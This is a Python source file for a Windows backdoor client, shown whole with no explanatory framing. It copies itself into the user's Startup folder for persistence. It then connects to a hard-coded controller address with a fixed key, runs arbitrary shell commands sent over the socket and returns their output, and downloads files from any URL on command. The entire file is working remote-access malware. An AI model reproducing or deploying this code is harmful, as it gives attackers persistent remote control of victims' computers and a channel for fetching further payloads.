from shutil import copyfile
import subprocess
import ctypes
import requests
import socket
import os
import sys
import time

key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
timeout = 60

host = '192.168.1.71'
port = 3142

program_name = 'main.exe'


def connect():
    try:
        print('Connecting...')
        client.connect((host, port))
        client.send(str.encode(key, 'utf-8'))
        print('Successful connected!')
    except socket.error:
        print(f'Connection refused. Reconnect in {timeout} seconds...')
        time.sleep(timeout)
        connect()


def disconnect():
    client.close()
    print('Connection closed')


def send(data):
    client.send(bytes(data + '\n', 'utf-8'))


def run_cmd_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, cwd=get_working_dir(), stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    proc.wait()

    out_data = stdout.decode('cp866')

    if len(out_data) == 0:
        out_data = stderr.decode('cp866')

    return out_data + 'OK'


def download_file(url, filename):
    r = requests.get(url, allow_redirects=True)
    open(filename, 'wb').write(r.content)
    return 'OK'


def get_working_dir():
    username = os.getlogin()
    return f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\' \
           f'Windows\\Start Menu\\Programs\\Startup'


def add_to_startup():
    working_dir = get_working_dir() + f'\\{program_name}'

    if not os.path.isfile(working_dir):
        copyfile(os.getcwd() + f'\\{program_name}', working_dir)
        print('Program was added to startup')
        ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
        subprocess.Popen([working_dir])
        sys.exit()
    else:
        print('Program have already added in startup')


add_to_startup()

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()

    while True:
        try:
            msg = client.recv(1024)

            if len(msg) <= 0:
                break

            command = msg.decode('utf-8')

            if command.startswith('cmd'):
                send(run_cmd_command(command[4:]))
            elif command.startswith('download'):
                params = command[9:].split()
                if len(params) == 0:
                    send('Specify the url and then the filename')
                elif len(params) == 1:
                    send('Specify the filename')
                else:
                    send(download_file(params[0], params[1]))
            elif command == 'ping':
                send('pong')
            else:
                send('Unknown command')
        except socket.error as e:
            print(str(e))
            break

    disconnect()
